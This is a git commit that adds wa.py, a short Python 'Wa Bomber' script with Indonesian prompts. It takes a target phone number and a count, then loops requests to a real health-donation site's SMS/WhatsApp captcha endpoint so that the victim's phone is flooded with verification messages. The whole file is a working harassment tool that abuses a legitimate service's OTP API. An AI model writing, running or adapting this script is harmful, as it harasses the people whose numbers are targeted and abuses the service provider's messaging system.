4bfa6c64833af5aec72c82f0d61f941724f53507
zfahmi2121 <66204096+zfahmi2121@users.noreply.github.com>
2020-06-01 16:20:52 -0700

    Create wa.py

---
+++ wa.py
@@ -0,0 +1,21 @@
+import requests as r
+
+banner = """
+                        _______
+                        [       ] 
+                        | 0   0 | 
+                      //|   °   |\\
+                     $  [__###__]  $
+                        | |   | |
+                        ---   ---
+                      ({Wa Bomber})
+"""
+print (banner)
+num = input('Masukan Nomor Tanpa 62/0 : ')
+jum = int(input('Jumlah :'))
+for i in range(jum):
+    req = r.get('https://passport.pedulisehat.id/v2/sms/captcha?mobile='+num+'&mobile_country_code=62&channel=WhatsApp&_=1591007074597')
+    if req.status_code == 200:
+       print('Succes Sent To :' +num)
+    else:
+       print('Gagal Mengirim')
